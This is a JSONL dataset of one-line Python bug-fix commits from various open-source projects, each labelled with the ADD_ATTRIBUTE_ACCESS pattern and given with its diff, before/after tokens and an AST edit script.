{"project": "xgds_core", "commit_sha": "c93b077d487dbcd1b0d7ad4db3e6694f646b4c63", "parent_sha": "8d2d84987e5d41d2a4cfc486e2dc4cb7807586db", "file_path": "xgds_core/views.py", "project_url": "https://github.com/xgds/xgds_core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ def getTimeZone(inputTime):\n     result = TimeZoneHistory.objects.filter(startTime__lte=inputTime, endTime__gte=inputTime)\n     if result.count() > 0:\n-        return result[0]\n+        return result[0].timeZone\n     else:\n         return settings.TIME_ZONE\n \n", "before": "return result [ 0 ]", "after": "return result [ 0 ] . timeZone", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"return_statement\", 2, 9, 2, 25], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"subscript\", 2, 16, 2, 25], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:timeZone\", \"T\"], 2]]"}
{"project": "waf-stage", "commit_sha": "2d29dfc528ee61d98ea43cebf101e344dcaf3491", "parent_sha": "9e92489dbc008e4abae9c147b1d63b48296797c2", "file_path": "waflib/Tools/waf_unit_test.py", "project_url": "https://github.com/Rob3rtS/waf-stage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class utest(Task.Task):\n \n \t\tfilename = self.inputs[0].abspath()\n-\t\tself.ut_exec = getattr(self, 'ut_exec', [filename])\n+\t\tself.ut_exec = getattr(self.generator, 'ut_exec', [filename])\n \t\tif getattr(self.generator, 'ut_fun', None):\n \t\t\tself.generator.ut_fun(self)\n \n", "before": "self . ut_exec = getattr ( self , 'ut_exec' , [ filename ] )", "after": "self . ut_exec = getattr ( self . generator , 'ut_exec' , [ filename ] )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 25, 2, 54], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 2, 26, 2, 30], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:generator\", \"T\"], 2]]"}
{"project": "waf-stage", "commit_sha": "6747ec18d82e3b747da7d14694557534c4c4f9db", "parent_sha": "578816dbca5120d572e4596f7594f8781c8180ff", "file_path": "waflib/Tools/ccroot.py", "project_url": "https://github.com/Rob3rtS/waf-stage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -511,7 +511,7 @@ def apply_vnum(self):\n \t\tbld = self.bld\n \t\tpath = self.install_task.dest\n \t\tif self.env.DEST_OS == 'openbsd':\n-\t\t\tlibname = self.outputs[0].name\n+\t\t\tlibname = self.link_task.outputs[0].name\n \t\t\tt1 = bld.install_as('%s%s%s' % (path, os.sep, libname), node, env=self.env, chmod=self.link_task.chmod)\n \t\t\tself.vnum_install_task = (t1,)\n \t\telse:\n", "before": "libname = self . outputs [ 0 ] . name", "after": "libname = self . link_task . outputs [ 0 ] . name", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 14, 3, 26], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 14, 3, 26], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 14, 3, 18], 0], [\"Move\", \"N0\", [\".:.\", 3, 18, 3, 19], 1], [\"Insert\", \"N0\", [\"identifier:link_task\", \"T\"], 2]]"}
{"project": "cms7", "commit_sha": "aa91cbe9a92aa22dbe250883b7867be1f4b4f20f", "parent_sha": "f84aa69e40d0656f4bd6614b147ec295159eb3c5", "file_path": "cms7/generator.py", "project_url": "https://github.com/freenode/cms7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -83,7 +83,7 @@ class GeneratorState:\n \n     def url_for(self, name):\n         return self.gen.build_url(self.targetpath, name) or \\\n-                self.env.undefined('url_for({!r})'.format(str(name)))\n+                self.gen.env.undefined('url_for({!r})'.format(str(name)))\n \n     def get_module(self, name):\n         return self.gen.config.module_id[name].get_api(self)\n", "before": "return self . gen . build_url ( self . targetpath , name ) or self . env . undefined ( 'url_for({!r})' . format ( str ( name ) ) )", "after": "return self . gen . build_url ( self . targetpath , name ) or self . gen . env . undefined ( 'url_for({!r})' . format ( str ( name ) ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 17, 3, 25], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 17, 3, 25], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 17, 3, 21], 0], [\"Move\", \"N0\", [\".:.\", 3, 21, 3, 22], 1], [\"Insert\", \"N0\", [\"identifier:gen\", \"T\"], 2]]"}
{"project": "odoo-saas-tools", "commit_sha": "a21374d34608da2355a5d785e4d69d9ceff201e0", "parent_sha": "453b39a6375c9c5b122593188d3877e3dcc240d2", "file_path": "saas_portal/models/wizard.py", "project_url": "https://github.com/QinerTech/odoo-saas-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -141,7 +141,7 @@ class SaasPortalCreateClient(models.TransientModel):\n         wizard = self[0]\n         res = wizard.plan_id.create_new_database(dbname=wizard.name, partner_id=wizard.partner_id.id, user_id=self.user_id.id,\n                                                  notify_user=self.notify_user,\n-                                                 support_team_id=self.support_team_id)\n+                                                 support_team_id=self.support_team_id.id)\n         client = self.env['saas_portal.client'].browse(res.get('id'))\n         client.server_id.action_sync_server()\n         return {\n", "before": "res = wizard . plan_id . create_new_database ( dbname = wizard . name , partner_id = wizard . partner_id . id , user_id = self . user_id . id , notify_user = self . notify_user , support_team_id = self . support_team_id )", "after": "res = wizard . plan_id . create_new_database ( dbname = wizard . name , partner_id = wizard . partner_id . id , user_id = self . user_id . id , notify_user = self . notify_user , support_team_id = self . support_team_id . id )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 66, 3, 86], [\"attribute\", 3, 66, 3, 86], 0], [\"Insert\", [\"attribute\", 3, 66, 3, 86], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 66, 3, 86], [\"identifier:id\", \"T\"], 2]]"}
{"project": "TWBlue", "commit_sha": "6e294ca0dace54d5edd4b3b6e95e78124d7fd8fd", "parent_sha": "3a5eeed372334c9fef8966bb16a31b47fb6e5ab3", "file_path": "src/sessionmanager/session.py", "project_url": "https://github.com/TWBlueQS/TWBlue", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -365,7 +365,7 @@ class Session(object):\n   \"Shelve the database to allow for persistance.\"\n   shelfname=paths.config_path(str(self.session_id)+\".db\")\n   try:\n-   if not os.exists(shelfname):\n+   if not os.path.exists(shelfname):\n     output.speak(\"Generating database, this might take a while.\",True)\n    shelf=shelve.open(paths.config_path(shelfname),'c')\n    for key,value in self.db.items():\n", "before": "if not os . exists ( shelfname ) : output . speak ( \"Generating database, this might take a while.\" , True )", "after": "if not os . path . exists ( shelfname ) : output . speak ( \"Generating database, this might take a while.\" , True )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 11, 3, 20], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 11, 3, 20], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:os\", 3, 11, 3, 13], 0], [\"Move\", \"N0\", [\".:.\", 3, 13, 3, 14], 1], [\"Insert\", \"N0\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "youtube-dl", "commit_sha": "4edeac5bfae76966fd14f636bd68850ea0403ece", "parent_sha": "f592ff98683794e0f79c96cbec67b737ae8da00c", "file_path": "youtube_dl/extractor/itv.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ class ITVIE(InfoExtractor):\n                 continue\n             ext = determine_ext(caption_url.text, 'ttml')\n             subtitles.setdefault('en', []).append({\n-                'url': caption_url,\n+                'url': caption_url.text,\n                 'ext': 'ttml' if ext == 'xml' else ext,\n             })\n \n", "before": "subtitles . setdefault ( 'en' , [ ] ) . append ( { 'url' : caption_url , 'ext' : 'ttml' if ext == 'xml' else ext , } )", "after": "subtitles . setdefault ( 'en' , [ ] ) . append ( { 'url' : caption_url . text , 'ext' : 'ttml' if ext == 'xml' else ext , } )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"pair\", 3, 17, 3, 35], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:caption_url\", 3, 24, 3, 35], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:text\", \"T\"], 2]]"}
{"project": "backend", "commit_sha": "9a5f08427ea855e1dcb2fdbf41191fc8dd16903a", "parent_sha": "1077e478e53c40d968e9172651d561f7d92c1764", "file_path": "test/test_lottery.py", "project_url": "https://github.com/Sakuten/backend", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -306,7 +306,7 @@ def test_apply_group(client):\n \n     with client.application.app_context():\n         index = Lottery.query.get(idx).index\n-        user_id = User.query.filter_by(secret_id=user['secret_id']).first()\n+        user_id = User.query.filter_by(secret_id=user['secret_id']).first().id\n         with mock.patch('api.routes.api.get_time_index',\n                         return_value=index):\n             resp = client.post(f'/lotteries/{idx}',\n", "before": "user_id = User . query . filter_by ( secret_id = user [ 'secret_id' ] ) . first ( )", "after": "user_id = User . query . filter_by ( secret_id = user [ 'secret_id' ] ) . first ( ) . id", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 76], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"call\", 3, 19, 3, 76], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:id\", \"T\"], 2]]"}
{"project": "twisted", "commit_sha": "8e7b87beeb228de943cad5be38398f41e0c23afa", "parent_sha": "dcadaabc38caad2a0296b02276a61f970f57a704", "file_path": "twisted/manhole/ui/gtkmanhole.py", "project_url": "https://github.com/longaccess/twisted", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,11 +8,11 @@ ingtkernet.install()\n \n class Interaction(gtk.GtkWindow):\n     def __init__(self):\n-        gtk.GtkWindow(self, gtk.WINDOW_TOPLEVEL)\n+        gtk.GtkWindow.__init__(self, gtk.WINDOW_TOPLEVEL)\n \tself.set_title(\"Manhole Interaction\")\n \n \tvb = gtk.GtkVBox()\n-\t\n+\n \tself.output = gtk.GtkText()\n \tgtkim.defocusify(self.output)\n", "before": "gtk . GtkWindow ( self , gtk . WINDOW_TOPLEVEL )", "after": "gtk . GtkWindow . __init__ ( self , gtk . WINDOW_TOPLEVEL )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 9, 3, 22], [\"attribute\", 3, 9, 3, 22], 0], [\"Insert\", [\"attribute\", 3, 9, 3, 22], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 9, 3, 22], [\"identifier:__init__\", \"T\"], 2]]"}
{"project": "twisted", "commit_sha": "ed30faddcee073c5d906aa8d15bbfab1746a9dcb", "parent_sha": "0e86b77db5f45c57e0d23dca18e668304312c276", "file_path": "twisted/web2/filter/range.py", "project_url": "https://github.com/longaccess/twisted", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def makeUnsatisfiable(request, oldresponse):\n     if request.headers.hasHeader('if-range'):\n         return oldresponse # Return resource instead of error\n     response = http.Response(responsecode.REQUESTED_RANGE_NOT_SATISFIABLE)\n-    response.setHeader(\"content-range\", ('bytes', None, None, oldresponse.stream.length))\n+    response.headers.setHeader(\"content-range\", ('bytes', None, None, oldresponse.stream.length))\n     return response\n \n def makeSegment(inputStream, lastOffset, start, end):\n", "before": "response . setHeader ( \"content-range\" , ( 'bytes' , None , None , oldresponse . stream . length ) )", "after": "response . headers . setHeader ( \"content-range\" , ( 'bytes' , None , None , oldresponse . stream . length ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 5, 3, 23], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 5, 3, 23], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:response\", 3, 5, 3, 13], 0], [\"Move\", \"N0\", [\".:.\", 3, 13, 3, 14], 1], [\"Insert\", \"N0\", [\"identifier:headers\", \"T\"], 2]]"}
{"project": "bravado-core", "commit_sha": "0ab18d21a65f72371882d3396808cd8113a7e18f", "parent_sha": "b65d58b7c41a217d1feb40b98f8d9e4676a3e48a", "file_path": "swaggerpy_test/resource_response_test.py", "project_url": "https://github.com/appneta/bravado-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -194,7 +194,7 @@ class ResourceResponseTest(unittest.TestCase):\n             httpretty.GET, \"http://localhost/test_http?test_param=foo\",\n             body='{\"some_foo\": \"bar\"}')\n         resource = SwaggerClient(u'http://localhost/api-docs').api_test\n-        resp = resource.testHTTP(test_param=\"foo\")()\n+        resp = resource.testHTTP(test_param=\"foo\").result()\n         self.assertEqual({\"some_foo\": \"bar\"}, resp)\n \n     # check array and datetime types\n", "before": "resp = resource . testHTTP ( test_param = \"foo\" ) ( )", "after": "resp = resource . testHTTP ( test_param = \"foo\" ) . result ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 53], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 51], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:result\", \"T\"], 2]]"}
{"project": "l10n-switzerland", "commit_sha": "e38ad0eb620a764d18274e27c08180b754098607", "parent_sha": "18cc3c2e652c91f02776005d85c446988f985706", "file_path": "l10n_ch_dta/wizard/create_dta.py", "project_url": "https://github.com/camptocamp/l10n-switzerland", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -608,7 +608,7 @@ class DTAFileGenerator(models.TransientModel):\n \n         elec_context['partner_bank_code'] = pline.bank_id.bank_bic\n         elec_context['reference'] = False\n-        if hasattr(pline, 'transaction_ref'):\n+        if hasattr(pline.move_line_id, 'transaction_ref'):\n             if pline.move_line_id.transaction_ref:\n                 elec_context['reference'] = pline.move_line_id.transaction_ref\n         if not elec_context['reference']:\n", "before": "if hasattr ( pline , 'transaction_ref' ) : if pline . move_line_id . transaction_ref : elec_context [ 'reference' ] = pline . move_line_id . transaction_ref", "after": "if hasattr ( pline . move_line_id , 'transaction_ref' ) : if pline . move_line_id . transaction_ref : elec_context [ 'reference' ] = pline . move_line_id . transaction_ref", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 19, 3, 45], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:pline\", 3, 20, 3, 25], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:move_line_id\", \"T\"], 2]]"}
{"project": "django-userena", "commit_sha": "3f74d19caf63d954e9ab3eaa99f844f02004d3d0", "parent_sha": "dfcf1c9e06e38c70b3d409890cb4c4aecfd44990", "file_path": "userena/utils.py", "project_url": "https://github.com/EE/django-userena", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def signin_redirect(redirect=None, user=None):\n     if redirect: return redirect\n-    elif user: return user.get_absolute_url()\n+    elif user: return user.account.get_absolute_url()\n     else: return settings.LOGIN_REDIRECT_URL\n \n def generate_sha1(string, salt=None):\n", "before": "return user . get_absolute_url ( )", "after": "return user . account . get_absolute_url ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 1, 23, 1, 44], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 1, 23, 1, 44], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:user\", 1, 23, 1, 27], 0], [\"Move\", \"N0\", [\".:.\", 1, 27, 1, 28], 1], [\"Insert\", \"N0\", [\"identifier:account\", \"T\"], 2]]"}
{"project": "django-userena", "commit_sha": "1ba52632d5117247680ad2b8d4054ee4165ff2bf", "parent_sha": "6a0bc1575a1816a130644efde411fbed131720be", "file_path": "userena/views.py", "project_url": "https://github.com/EE/django-userena", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -614,7 +614,7 @@ def profile_detail(request, username,\n     try:\n         profile = user.get_profile()\n     except profile_model.DoesNotExist:\n-        profile = profile_model.create(user=user)\n+        profile = profile_model.objects.create(user=user)\n \n     if not profile.can_view_profile(request.user):\n         return HttpResponseForbidden(_(\"You don't have permission to view this profile.\"))\n", "before": "profile = profile_model . create ( user = user )", "after": "profile = profile_model . objects . create ( user = user )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 19, 3, 39], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 19, 3, 39], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:profile_model\", 3, 19, 3, 32], 0], [\"Move\", \"N0\", [\".:.\", 3, 32, 3, 33], 1], [\"Insert\", \"N0\", [\"identifier:objects\", \"T\"], 2]]"}
{"project": "python-keystoneclient", "commit_sha": "a6312d52b7a493dea156221f55a952ef21a628bf", "parent_sha": "6d0afcc98e3df36f9b57642daef25d4d3091acf7", "file_path": "keystoneclient/access.py", "project_url": "https://github.com/promptworks/python-keystoneclient", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class AccessInfo(dict):\n \n     def __init__(self, *args, **kwargs):\n         super(AccessInfo, self).__init__(*args, **kwargs)\n-        self.service_catalog = service_catalog.ServiceCatalog(\n+        self.service_catalog = service_catalog.ServiceCatalog.factory(\n             resource_dict=self, region_name=self.get('region_name'))\n \n     def has_service_catalog(self):\n", "before": "self . service_catalog = service_catalog . ServiceCatalog ( resource_dict = self , region_name = self . get ( 'region_name' ) )", "after": "self . service_catalog = service_catalog . ServiceCatalog . factory ( resource_dict = self , region_name = self . get ( 'region_name' ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 32, 3, 62], [\"attribute\", 3, 32, 3, 62], 0], [\"Insert\", [\"attribute\", 3, 32, 3, 62], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 32, 3, 62], [\"identifier:factory\", \"T\"], 2]]"}
{"project": "django-seo", "commit_sha": "cfaa59b6568f07514a4b2370b0b02a9762aab723", "parent_sha": "e7726f1219068c1d0f0785aaf4e80ae6513ee0e6", "file_path": "seo/context_processors.py", "project_url": "https://github.com/hzdg/django-seo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4,6 +4,6 @@ from seo.models import MetaData, template_meta_data, CONTEXT_VARIABLE\n \n def seo(request):\n     try:\n-        return {CONTEXT_VARIABLE: template_meta_data(request)}\n+        return {CONTEXT_VARIABLE: template_meta_data(request.path_info)}\n     except MetaData.DoesNotExist:\n         return MetaData().context\n", "before": "return { CONTEXT_VARIABLE : template_meta_data ( request ) }", "after": "return { CONTEXT_VARIABLE : template_meta_data ( request . path_info ) }", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 53, 3, 62], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:request\", 3, 54, 3, 61], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:path_info\", \"T\"], 2]]"}
{"project": "dd-agent", "commit_sha": "d8a232bd61870e782ed473b16af7757050f504f8", "parent_sha": "c7437323f413a014aebc73c7990b260a2b165a19", "file_path": "checks.d/snmp.py", "project_url": "https://github.com/zendesk/dd-agent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -337,7 +337,7 @@ class SnmpCheck(AgentCheck):\n                 name = metric['symbol']\n                 result = results[name].items()\n                 if len(result) > 1:\n-                    self.log(\"Several rows corresponding while the metric is supposed to be a scalar\")\n+                    self.log.warning(\"Several rows corresponding while the metric is supposed to be a scalar\")\n                     continue\n                 val = result[0][1]\n                 self.submit_metric(name, val, tags)\n", "before": "self . log ( \"Several rows corresponding while the metric is supposed to be a scalar\" )", "after": "self . log . warning ( \"Several rows corresponding while the metric is supposed to be a scalar\" )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 21, 3, 29], [\"attribute\", 3, 21, 3, 29], 0], [\"Insert\", [\"attribute\", 3, 21, 3, 29], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 21, 3, 29], [\"identifier:warning\", \"T\"], 2]]"}
{"project": "pyart", "commit_sha": "ffcc41320d6dc60a998c39ee1fd1f734a487c5fa", "parent_sha": "79f5c7d7db06454b779bc7cb075898b9af38cfab", "file_path": "pyart/config.py", "project_url": "https://github.com/simepar/pyart", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -139,7 +139,7 @@ def get_field_colormap(field):\n         return _DEFAULT_FIELD_COLORMAP[field]\n     else:\n         import matplotlib.cm\n-        return matplotlib.cm.get_cmap()\n+        return matplotlib.cm.get_cmap().name\n \n \n def get_field_limits(field, container=None, selection=0):\n", "before": "return matplotlib . cm . get_cmap ( )", "after": "return matplotlib . cm . get_cmap ( ) . name", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 40], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 40], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:name\", \"T\"], 2]]"}
{"project": "xonsh", "commit_sha": "b05025e30761905e37ea958995feaa6599641504", "parent_sha": "c5c4f3f9f55be70887fea0ff78639ebaedab24a2", "file_path": "xonsh/proc.py", "project_url": "https://github.com/nicfit/xonsh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -501,7 +501,7 @@ class PopenThread(threading.Thread):\n         \"\"\"Signal handler for SIGINT - Ctrl+C may have been pressed.\"\"\"\n         self.send_signal(signum)\n         time.sleep(self.timeout)\n-        if self.poll() is not None:\n+        if self.proc.poll() is not None:\n             self._restore_sigint(frame=frame)\n \n     def _restore_sigint(self, frame=None):\n", "before": "if self . poll ( ) is not None : self . _restore_sigint ( frame = frame )", "after": "if self . proc . poll ( ) is not None : self . _restore_sigint ( frame = frame )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 12, 3, 21], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 12, 3, 21], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 12, 3, 16], 0], [\"Move\", \"N0\", [\".:.\", 3, 16, 3, 17], 1], [\"Insert\", \"N0\", [\"identifier:proc\", \"T\"], 2]]"}
{"project": "build.labs.clusterhq.com", "commit_sha": "988e0b02faf32d846dfbc467d366469a088032c0", "parent_sha": "51a37e64a690c1cb922b77b388ed077c232ed6cc", "file_path": "flocker_bb/steps.py", "project_url": "https://github.com/lukemarsden/build.labs.clusterhq.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def getFactory(codebase, useSubmodules=True, mergeForward=False):\n \n @renderer\n def buildbotURL(build):\n-    return build.getBuild().build_status.master.getBuildbotURL()\n+    return build.getBuild().build_status.master.status.getBuildbotURL()\n \n \n \n", "before": "return build . getBuild ( ) . build_status . master . getBuildbotURL ( )", "after": "return build . getBuild ( ) . build_status . master . status . getBuildbotURL ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 12, 3, 48], [\"attribute\", 3, 12, 3, 48], 0], [\"Insert\", [\"attribute\", 3, 12, 3, 48], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 12, 3, 48], [\"identifier:status\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "ffa28354febfb387dbfb8a694b2cfe916d5224b8", "parent_sha": "6e7ada19a93b5046cafa4585464f45ce7313ecdd", "file_path": "lib/python/Plugins/SystemPlugins/SoftwareManager/Flash_online.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -394,7 +394,7 @@ class FlashImage(Screen):\n \t\t\t\tself.recordcheck = True\n \t\t\t\trec = self.session.nav.RecordTimer.isRecording()\n \t\t\t\tnext_rec_time = self.session.nav.RecordTimer.getNextRecordingTime()\n-\t\t\t\tif rec or (next_rec_time > 0 and (next_rec_time - time()) < 360):\n+\t\t\t\tif rec or (next_rec_time > 0 and (next_rec_time - time.time()) < 360):\n \t\t\t\t\tself.answer = answer\n \t\t\t\t\tself.session.openWithCallback(self.recordWarning, MessageBox, _(\"Recording(s) are in progress or coming up in few seconds!\") + '\\n' + _(\"Really reflash your %s %s and reboot now?\") % (getMachineBrand(), getMachineName()), default=False)\n \t\t\t\t\treturn\n", "before": "if rec or ( next_rec_time > 0 and ( next_rec_time - time ( ) ) < 360 ) : self . answer = answer self . session . openWithCallback ( self . recordWarning , MessageBox , _ ( \"Recording(s) are in progress or coming up in few seconds!\" ) + '\\n' + _ ( \"Really reflash your %s %s and reboot now?\" ) % ( getMachineBrand ( ) , getMachineName ( ) ) , default = False ) return", "after": "if rec or ( next_rec_time > 0 and ( next_rec_time - time . time ( ) ) < 360 ) : self . answer = answer self . session . openWithCallback ( self . recordWarning , MessageBox , _ ( \"Recording(s) are in progress or coming up in few seconds!\" ) + '\\n' + _ ( \"Really reflash your %s %s and reboot now?\" ) % ( getMachineBrand ( ) , getMachineName ( ) ) , default = False ) return", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 55, 3, 61], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:time\", 3, 55, 3, 59], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:time\", \"T\"], 2]]"}
{"project": "Cura", "commit_sha": "3b3551de47ef5eda4287c0b6a5b9b4ec4897db40", "parent_sha": "79e24189ed8581bb1978a31f74d76fb9c6177bfa", "file_path": "Cura/gui/mainWindow.py", "project_url": "https://github.com/mkbot/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ def main():\n \t\t\t\texcept:\n \t\t\t\t\tpass\n \t\t\t\tfor filename in glob.glob(os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'example'))):\n-\t\t\t\t\tshutil.copy(filename, os.path.join(os.path.dirname(exampleFile), os.basename(filename)))\n+\t\t\t\t\tshutil.copy(filename, os.path.join(os.path.dirname(exampleFile), os.path.basename(filename)))\n \t\t\t\tprofile.putPreference('lastFile', exampleFile)\n \t\tconfigWizard.configWizard()\n \tif profile.getPreference('startMode') == 'Simple':\n", "before": "shutil . copy ( filename , os . path . join ( os . path . dirname ( exampleFile ) , os . basename ( filename ) ) )", "after": "shutil . copy ( filename , os . path . join ( os . path . dirname ( exampleFile ) , os . path . basename ( filename ) ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 71, 3, 82], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 71, 3, 82], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:os\", 3, 71, 3, 73], 0], [\"Move\", \"N0\", [\".:.\", 3, 73, 3, 74], 1], [\"Insert\", \"N0\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "jumpserver", "commit_sha": "6a51bd1a1c69065d1d9b898b27a14568cccb412c", "parent_sha": "fd713e0e5ca778a5c9659fe5e44080daaf6b4fb8", "file_path": "run_server.py", "project_url": "https://github.com/BoriszhangSec/jumpserver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -364,7 +364,7 @@ class WebTerminalHandler(tornado.websocket.WebSocketHandler):\n             self.term.input_mode = True\n             if str(jsondata['data']) in ['\\r', '\\n', '\\r\\n']:\n                 if self.term.vim_flag:\n-                    match = re.compile(r'\\x1b\\[\\?1049', re.X).findall(self.vim_data)\n+                    match = re.compile(r'\\x1b\\[\\?1049', re.X).findall(self.term.vim_data)\n                     if match:\n                         if self.term.vim_end_flag or len(match) == 2:\n                             self.term.vim_flag = False\n", "before": "match = re . compile ( r'\\x1b\\[\\?1049' , re . X ) . findall ( self . vim_data )", "after": "match = re . compile ( r'\\x1b\\[\\?1049' , re . X ) . findall ( self . term . vim_data )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 71, 3, 84], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 71, 3, 84], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 71, 3, 75], 0], [\"Move\", \"N0\", [\".:.\", 3, 75, 3, 76], 1], [\"Insert\", \"N0\", [\"identifier:term\", \"T\"], 2]]"}
